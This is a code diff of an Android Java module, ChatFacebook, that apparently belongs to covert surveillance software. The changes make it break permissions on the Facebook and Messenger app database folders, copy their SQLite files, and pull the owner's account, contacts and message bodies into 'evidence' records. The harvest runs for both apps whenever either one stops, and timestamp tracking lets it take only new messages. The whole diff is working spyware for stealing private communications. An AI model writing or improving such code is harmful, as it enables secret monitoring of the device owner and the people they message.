@@ -41,13 +41,16 @@ public class ChatFacebook extends SubModuleChat {
 	private Hashtable<String, Long> lastFb;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
-	private String dbDir;
+	// private String dbDir;
 
 	private String account_uid;
 
 	private String account_name;
 
-	private Hashtable<String,Contact> contacts = new Hashtable<String, Contact>();
+	String dirKatana = "/data/data/com.facebook.katana/databases";
+	String dirOrca = "/data/data/com.facebook.orca/databases";
+
+	private Hashtable<String, Contact> contacts = new Hashtable<String, Contact>();
 
 	@Override
 	public int getProgramId() {
@@ -60,8 +63,11 @@ public class ChatFacebook extends SubModuleChat {
 	}
 
 	@Override
-	void notifyStopProgram() {
-		readFbMessageHistory();
+	void notifyStopProgram(String processName) {
+		if (processName.contains("katana"))
+			fetchFb(dirKatana);
+		else if (processName.contains("orca"))
+			fetchFb(dirOrca);
 	}
 
 	@Override
@@ -71,13 +77,19 @@ public class ChatFacebook extends SubModuleChat {
 			Check.log(TAG + " (start), read lastFb: " + lastFb);
 		}
 
-		if (readMyAccount()) {
+		fetchFb(dirKatana);
+
+		fetchFb(dirOrca);
+
+	}
+
+	private void fetchFb(String dir) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (fetchFb) " + dir);
+		}
+		if (readMyAccount(dir)) {
 			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.FACEBOOK, account_uid, account_name);
-			readFbMessageHistory();
-		}else{
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (start) Error: cannot read my account");
-			}
+			readFbMessageHistory(dir);
 		}
 	}
 
@@ -88,15 +100,10 @@ public class ChatFacebook extends SubModuleChat {
 		}
 	}
 
-	private boolean readMyAccount() {
-		String fbdir2 = "/data/data/com.facebook.katana/databases";
-		String fbdir1 = "/data/data/com.facebook.orca/databases";
+	private boolean readMyAccount(String dbDir) {
 
-		if (Path.unprotect(fbdir1)) {
-			dbDir = fbdir1;
-		} else if (Path.unprotect(fbdir2)) {
-			dbDir = fbdir2;
-		} else {
+		if (!Path.unprotect(dbDir)) {
+
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readMyAccount) cannot unprotect dir");
 			}
@@ -105,7 +112,7 @@ public class ChatFacebook extends SubModuleChat {
 
 		String dbFile = "prefs_db";
 		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
-		if(helper == null){
+		if (helper == null) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readMyAccount) Error: cannot open " + dbDir + "/" + dbFile);
 			}
@@ -127,7 +134,7 @@ public class ChatFacebook extends SubModuleChat {
 		return true;
 	}
 
-	private void readFbMessageHistory() {
+	private void readFbMessageHistory(String dbDir) {
 		if (!readChatSemaphore.tryAcquire()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (readFbMessageHistory), semaphore red");
@@ -139,17 +146,17 @@ public class ChatFacebook extends SubModuleChat {
 			boolean updateMarkup = false;
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (readFbMessageHistory) account: " + account_uid);
+				Check.log(TAG + " (readFbMessageHistory) account: " + account_uid + " dir: " + dbDir);
 			}
 
 			Path.unprotectAll(dbDir, true);
 
 			if (ModuleAddressBook.getInstance() != null) {
 				if (Path.unprotect(dbDir, "users_db2", true)) {
-					readAddressUser();
+					readAddressUser(dbDir);
 
 				} else if (Path.unprotect(dbDir, "contacts_db2", true)) {
-					readAddressContacts();
+					readAddressContacts(dbDir);
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -171,13 +178,19 @@ public class ChatFacebook extends SubModuleChat {
 						Check.log(TAG + " (readFbMessageHistory) conversation: " + conv.id);
 					}
 					long lastConvId = lastFb.containsKey(conv.id) ? lastFb.get(conv.id) : 0;
-					int lastReadId = (int) fetchMessages(helper, conv, lastConvId);
+					if (lastConvId < conv.timestamp) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (readFbMessageHistory) lastConvId(" + lastConvId 
+									+ ") < conv.timestamp("+ conv.timestamp +")");
+						}
+						long lastReadId = (long) fetchMessages(helper, conv, lastConvId);
 
-					if (lastReadId > 0) {
-						updateMarkupFb(conv.id, lastReadId, true);
+						if (lastReadId > 0) {
+							updateMarkupFb(conv.id, lastReadId, true);
+						}
 					}
 				}
-			}else {
+			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (getFbConversations) Error: null helper");
 				}
@@ -215,7 +228,8 @@ public class ChatFacebook extends SubModuleChat {
 					Date date = new Date(timestamp);
 
 					if (Cfg.DEBUG) {
-						Check.log(TAG + " (cursor) sc.account: " + conv.account + " peer: " + peer + " body: " + body);
+						Check.log(TAG + " (cursor) sc.account: " + conv.account + " peer: " + peer + " body: " + body
+								+ " timestamp:" + timestamp);
 					}
 
 					boolean incoming = !(peer.equals(conv.account));
@@ -293,7 +307,7 @@ public class ChatFacebook extends SubModuleChat {
 
 		final List<FbConversation> conversations = new ArrayList<FbConversation>();
 
-		String[] projection = new String[] { "thread_id", "participants" };
+		String[] projection = new String[] { "thread_id", "participants", "timestamp_ms" };
 		String selection = "timestamp_ms > 0 ";
 
 		RecordVisitor visitor = new RecordVisitor(projection, selection) {
@@ -305,12 +319,14 @@ public class ChatFacebook extends SubModuleChat {
 				c.id = cursor.getString(0);
 
 				String value = cursor.getString(1);
+				c.timestamp = cursor.getLong(2);
 				Contact[] contacts;
 				try {
 					contacts = json2Contacts(value);
 					c.contacts = contacts;
 					if (Cfg.DEBUG) {
-						//Check.log(TAG + " (cursor) contacts: " + contacts[0].name + " -> " + contacts[1].name);
+						// Check.log(TAG + " (cursor) contacts: " +
+						// contacts[0].name + " -> " + contacts[1].name);
 					}
 				} catch (JSONException e) {
 					// TODO Auto-generated catch block
@@ -326,7 +342,7 @@ public class ChatFacebook extends SubModuleChat {
 		return conversations;
 	}
 
-	private void readAddressUser() {
+	private void readAddressUser(String dbDir) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readAddressUser) ");
 		}
@@ -343,8 +359,7 @@ public class ChatFacebook extends SubModuleChat {
 
 	}
 
-
-	private void readAddressContacts() {
+	private void readAddressContacts(String dbDir) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (readAddressContacts) ");
 		}
